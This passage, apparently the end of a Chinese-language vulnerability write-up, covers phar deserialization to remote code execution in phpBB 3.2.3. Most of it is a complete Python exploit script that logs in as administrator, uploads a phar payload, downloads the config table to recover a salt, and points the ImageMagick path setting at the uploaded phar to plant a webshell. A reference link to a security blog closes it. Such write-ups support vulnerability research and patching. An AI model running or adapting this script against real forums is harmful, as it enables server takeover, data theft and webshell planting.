至此我们已经对上传文件路径内容可知可控，还恶意文件中的利用链。
### 利用链
利用PHP网络请求插件Guzzle完成反序列化利用。
文件位置：`phpBB3/vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php`
析构函数调用`save`函数，最后使用`file_put_contents`完成文件写入，整个漏洞利用完成。
## 利用脚本
    # coding =utf-8
    import requests
    from bs4 import BeautifulSoup
    import re
    proxies = {
        "http": "http://127.0.0.1:8080",
    }
    import hashlib
    def md5(str):
        m = hashlib.md5()
        m.update(str.encode("utf8"))
        return m.hexdigest()
    if __name__ == '__main__':
        target = "http://bugtest.com/phpBB3"
        admin_account = 'admin'
        admin_pwd = '123456'
        phar_payload = 'payload.phar.zip'
        upfilename = 'rai4over.zip'
        r = requests.Session()
        data = {
            'username': admin_account,
            'password': admin_pwd,
            'login': 'Login'
        }
        print('Start logging in to the administrator account')
        rs = r.post(target + '/ucp.php?mode=login', data=data)
        html = rs.text
        if ('header-profile dropdown-container' in html) and ("class=\"username-coloured\">" + admin_account in html):
            print('OK! The administrator account is successfully logged in')
        else:
            exit('No! Login failed . Probably because of the verification code')
        soup = BeautifulSoup(html, "html.parser")
        input = soup.find('input', attrs={'name': 'sid'})
        sid = input['value']
        file = {
            'fileupload': open(phar_payload, "rb").read()
        }
        data = {
            'name': upfilename,
            'chunk': 0,
            'chunks': 3,
            'add_file': 'Add the file',
            'real_filename': 'payload.phar.zip'
        }
        rs = r.post(target + '/posting.php?mode=post&f=2&sid=' + sid, files=file, data=data)
        if 'jsonrpc' not in rs.text:
            exit('Upload fail')
        else:
            print('Uploading malicious file successfully')
        Admin_Control = target + '/adm/index.php?sid=' + sid
        print("Get Administration Control Panel URL ：" + Admin_Control)
        rs = r.get(Admin_Control)
        html = rs.text
        soup = BeautifulSoup(html, "html.parser")
        input = soup.find('input', attrs={'type': 'password'})
        passwd_id = input['id']
        credential = soup.find('input', attrs={'name': 'credential'})
        credential = credential['value']
        data = {
            'username': admin_account,
            passwd_id: admin_pwd,
            'login': 'Login',
            'redirect': './../adm/index.php',
            'credential': credential
        }
        rs = r.post(target + '/adm/index.php?sid=' + sid, data=data)
        html = rs.text
        if 'ACP index' in html:
            print('Administration Control Panel login successful')
        soup = BeautifulSoup(html, "html.parser")
        div = soup.find('div', attrs={'id': 'page-header'})
        sid = div.a['href'][-32:]
        rs = r.get(target + '/adm/index.php?i=acp_database&mode=backup&sid=' + sid)
        html = rs.text
        soup = BeautifulSoup(html, "html.parser")
        input = soup.find('input', attrs={'name': 'form_token'})
        form_token = input['value']
        input = soup.find('input', attrs={'name': 'creation_time'})
        creation_time = input['value']
        data = "type=data&method=text&where=download&table%5B%5D=phpbb_config&submit=Submit&creation_time={creation_time}&form_token={form_token}".format(
            creation_time=creation_time, form_token=form_token)
        rs = r.post(target + '/adm/index.php?i=acp_database&mode=backup&action=download&sid=' + sid, data=data,
                    headers={"Content-Type": "application/x-www-form-urlencoded", "Connection": "close",
                             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"})
        html = rs.text
        if 'phpBB Backup Script' in html:
            print('Database download succeeded')
            matchObj = re.search(r"\('plupload_salt', '(.*?)', 0\)", html, re.M | re.I)
            if matchObj:
                plupload_salt = matchObj.group(1)
                print('Get the plupload_salt successfully ：{plupload_salt}'.format(plupload_salt=plupload_salt))
            else:
                exit('Get the plupload_salt failed')
        else:
            exit('Database download failed')
        print('Calculate the name of the phar')
        name = "{plupload_salt}_{md5name}zip.part".format(plupload_salt=plupload_salt, md5name=md5(upfilename))
        rs = r.get(target + '/adm/index.php?i=acp_attachmenpartts&mode=attach&sid=' + sid)
        html = rs.text
        soup = BeautifulSoup(html, "html.parser")
        input = soup.find('input', attrs={'name': 'form_token'})
        form_token = input['value']
        print("Get form_token from Attachment settings：{form_token}".format(form_token=form_token))
        data = "config%5Ballow_attachments%5D=1&config%5Ballow_pm_attach%5D=0&config%5Bupload_path%5D=files&config%5Bdisplay_order%5D=0&config%5Battachment_quota%5D=50&attachment_quota=mb&config%5Bmax_filesize%5D=256&max_filesize=kb&config%5Bmax_filesize_pm%5D=256&max_filesize_pm=kb&config%5Bmax_attachments%5D=3&config%5Bmax_attachments_pm%5D=1&config%5Bsecure_downloads%5D=0&config%5Bsecure_allow_deny%5D=1&config%5Bsecure_allow_empty_referer%5D=1&config%5Bcheck_attachment_content%5D=1&config%5Bimg_display_inlined%5D=1&config%5Bimg_create_thumbnail%5D=0&config%5Bimg_max_thumb_width%5D=400&config%5Bimg_min_thumb_filesize%5D=12000&config%5Bimg_imagick%5D={upfile}&config%5Bimg_max_width%5D=0&config%5Bimg_max_height%5D=0&config%5Bimg_link_width%5D=0&config%5Bimg_link_height%5D=0&submit=Submit&ips=&ipexclude=0&creation_time=1552465991&form_token={form_token}".format(
            form_token=form_token,
            upfile='phar://../files/plupload/' + name)
        rs = r.post(target + '/adm/index.php?i=acp_attachments&mode=attach&sid=' + sid, data=data)
        print('Get webshell succeeded')
参考链接:
  * [phpBB 3.2.3: Phar Deserialization to RCE](https://blog.ripstech.com/2018/phpbb3-phar-deserialization-to-remote-code-execution/)